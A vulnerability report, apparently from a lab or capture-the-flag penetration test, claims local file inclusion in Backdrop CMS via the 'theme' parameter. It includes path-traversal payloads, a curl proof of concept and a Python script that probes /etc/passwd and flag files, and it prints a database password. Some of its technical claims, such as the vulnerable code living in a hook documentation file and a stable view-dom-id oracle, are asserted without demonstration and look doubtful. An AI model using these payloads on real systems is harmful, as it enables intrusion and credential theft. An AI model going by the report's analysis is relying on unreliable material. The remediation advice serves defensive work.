# Local File Inclusion via theme Parameter in Backdrop CMS

**ID:** vuln-0006
**Severity:** HIGH
**Found:** 2026-02-24 15:10:32 UTC
**Target:** http://dog.htb
**CVSS:** 8.2

## Description

Backdrop CMS 1.27.1 is vulnerable to local file inclusion (LFI) via the unsanitized 'theme' GET parameter. The vulnerability exists in core/modules/system/system.api.php where hook_custom_theme() returns $_GET['theme'] without validation, allowing an attacker to include arbitrary local files.

## Impact

Arbitrary local file read. An attacker can retrieve sensitive system files (e.g., /etc/passwd, /etc/hostname), application source code (index.php, settings.php), and configuration files. The settings.php file contains database credentials (mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop). The vulnerability could potentially be chained with other filters to achieve remote code execution.

## Technical Analysis

The vulnerability stems from the implementation of hook_custom_theme() in system.api.php. The function directly returns the user-supplied 'theme' parameter from $_GET without any sanitization or path validation. This value is later used in theme selection logic, leading to local file inclusion when a path traversal payload is provided (e.g., ../../../../../etc/passwd). The included file is processed by PHP and its output becomes part of the rendered page. While direct file content is not always visible due to theme processing side-effects, the inclusion can be detected via a deterministic oracle: the view-dom-id attribute changes to a stable hash for each included file when the inclusion succeeds (controlled by a Views hook that sets dom_id). This provides a reliable side-channel to confirm file existence and, with further analysis, could enable blind byte-by-byte extraction.

## Proof of Concept

1. Send request: curl "http://dog.htb/?theme=../../../etc/passwd"
2. Observe the view-dom-id attribute in the HTML. Compare against baseline (normal request) to confirm inclusion. The hash will be stable across multiple requests for the same file.
3. To read arbitrary files, use path traversal: ?theme=../../../path/to/file
4. Example: reading settings.php reveals database credentials.

The LFI also works via the RSS feed endpoint: /?q=rss.xml&url=file:///etc/passwd (URL-encoded).

```
#!/usr/bin/env python3
"""
LFI Oracle PoC for Backdrop CMS
Detects successful inclusion by checking stability of view-dom-id hash.
"""

import requests
import re
import hashlib

BASE = "http://dog.htb"

def get_dom_hash(path):
    params = {"theme": path}
    resp = requests.get(BASE, params=params, timeout=10)
    match = re.search(r"view-dom-id-([a-f0-9]{32})", resp.text)
    if match:
        return match.group(1)
    return None

def main():
    baseline = get_dom_hash("")
    print(f"Baseline hash: {baseline}")

    test_paths = [
        "../../../etc/passwd",
        "../../../etc/hostname",
        "../../../root/root.txt",
        "../../../home/user/user.txt"
    ]

    for p in test_paths:
        h = get_dom_hash(p)
        # Request twice to confirm stability
        h2 = get_dom_hash(p)
        print(f"Path: {p} -> hash: {h} (stable: {h==h2})")

if __name__ == "__main__":
    main()
```

## Remediation

1. Validate and sanitize the 'theme' parameter in hook_custom_theme() implementation. Only allow known, safe theme names from a configured allowlist.
2. Use a basename or realpath check to ensure the resolved theme path stays within the expected themes directory.
3. Consider using a whitelist approach instead of dynamic includes based on user input.
4. Apply the principle of least privilege: ensure the web server process user cannot read sensitive files outside the web root if possible (though this is defense-in-depth only).
5. Review and harden all similar dynamic inclusion patterns throughout the codebase.
